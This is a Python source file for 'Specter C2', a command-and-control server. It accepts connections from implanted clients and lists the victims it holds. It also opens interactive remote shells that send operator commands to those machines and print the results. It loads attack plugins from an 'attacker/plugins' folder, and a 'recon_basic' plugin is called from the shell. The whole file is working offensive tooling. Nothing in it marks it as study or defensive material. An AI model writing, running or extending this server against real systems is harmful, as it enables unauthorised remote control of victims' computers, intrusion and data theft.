import os
import socket
import threading
import importlib.util

clients = []  # List of (socket, address)
loaded_plugins = []  # List to store the loaded plugins

def handle_connection(server_socket):
    while True:
        client_sock, client_addr = server_socket.accept()
        print(f"[+] New connection from {client_addr}")
        clients.append((client_sock, client_addr))

def remove_disconnected_clients():
    global clients
    alive_clients = []
    for sock, addr in clients:
        try:
            sock.send(b'ping')
            sock.settimeout(1)
            sock.recv(1024)
            alive_clients.append((sock, addr))
        except:
            print(f"[!] Removing dead client: {addr}")
            sock.close()
    clients = alive_clients

def client_shell(client_socket, client_addr, idx):
    while True:
        try:
            command = input(f"SPECTER:{client_addr}> ")

            if command.lower() == "exit":
                client_socket.send(b"exit")
                break

            elif command.lower() == "back":
                print("[*] Returning to main menu.")
                break

            # Look up and run the recon_basic plugin if the command is 'recon_basic'
            elif command.lower() == "recon_basic":
                for plugin_name, plugin_func in loaded_plugins:
                    if plugin_name == "recon_basic":
                        plugin_func(client_socket)
                        break

            client_socket.send(command.encode())
            output = client_socket.recv(4096).decode()
            print(output)

        except Exception as e:
            print(f"[-] Error with client {idx}: {e}")
            break

def load_plugins():
    plugin_list = []
    plugin_dir = "attacker/plugins"
    for filename in os.listdir(plugin_dir):
        if filename.endswith(".py") and filename != "__init__.py":
            path = os.path.join(plugin_dir, filename)
            name = filename[:-3]
            spec = importlib.util.spec_from_file_location(name, path)
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            if hasattr(module, "run"):
                plugin_list.append((name, module.run))
                print(f"[+] Loaded plugin: {name}")
    return plugin_list

def start_server(host='0.0.0.0', port=9001):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"[+] Specter C2 Server listening on {host}:{port}")

    threading.Thread(target=handle_connection, args=(server_socket,), daemon=True).start()

    global loaded_plugins
    loaded_plugins = load_plugins()  # Load all available plugins

    while True:
        try:
            cmd = input("C2> ").strip()

            if cmd == "list":
                remove_disconnected_clients()
                for idx, (sock, addr) in enumerate(clients):
                    print(f"[{idx}] {addr}")

            elif cmd.startswith("select "):
                try:
                    idx = int(cmd.split()[1])
                    sock, addr = clients[idx]
                    print(f"[+] Shell opened for {addr}")
                    client_shell(sock, addr, idx)
                    remove_disconnected_clients()
                except (IndexError, ValueError):
                    print("[-] Invalid index.")

            elif cmd == "exit":
                print("[*] Shutting down C2 server.")
                for sock, _ in clients:
                    try:
                        sock.send(b"exit")
                        sock.close()
                    except:
                        pass
                break

            else:
                print("[?] Commands: list, select <index>, exit")

        except KeyboardInterrupt:
            print("\n[*] C2 interrupted. Exiting.")
            break

if __name__ == "__main__":
    start_server()
